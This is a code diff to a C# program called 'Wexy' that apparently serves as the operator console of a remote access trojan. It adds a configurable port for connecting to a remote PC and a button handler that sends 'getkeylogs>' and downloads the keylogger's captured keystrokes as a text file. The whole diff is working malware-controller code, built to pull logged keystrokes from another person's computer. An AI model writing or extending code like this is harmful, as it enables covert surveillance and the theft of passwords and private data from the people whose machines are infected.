@@ -18,6 +18,7 @@ namespace Wexy
         public static NetworkStream Receiver; //this is used to get data from the server
         public static NetworkStream Writer; //this is used to send commands to the server
         public static string remotepcIp;
+        public static int remotepcPort;
         public static TcpClient client;
         
 
@@ -175,12 +176,14 @@ namespace Wexy
             RemoteComputerIP r = new RemoteComputerIP();
             r.ShowDialog();
             remotepcIp = r.GetIp();
-            lbl_ip.Text = remotepcIp;
+            remotepcPort = Int32.Parse(r.GetPort());
+            lbl_ip.Text = remotepcIp + ":"+ remotepcPort.ToString();
+
             client = new TcpClient();
             
             try
             {
-                client.Connect(remotepcIp, 2000);
+                client.Connect(remotepcIp, remotepcPort);
                 Writer = client.GetStream();
                 Receiver = client.GetStream();
                 SendCommand("pcname>");
@@ -347,6 +350,13 @@ namespace Wexy
                 int index1 = txb_directorypath.Text.IndexOf(" |");
                 txb_directorypath.Text = txb_directorypath.Text.Remove(index1);
             }
+        }
+
+        private void btn_enablekeylogger_Click(object sender, EventArgs e)
+        {
+            SendCommand("getkeylogs>");
+            ReceiveFile("txt");
+            MessageBox.Show("The log file which contains the keys logged by the keyloggger was successfully captured !");            
         }
         #endregion
     }
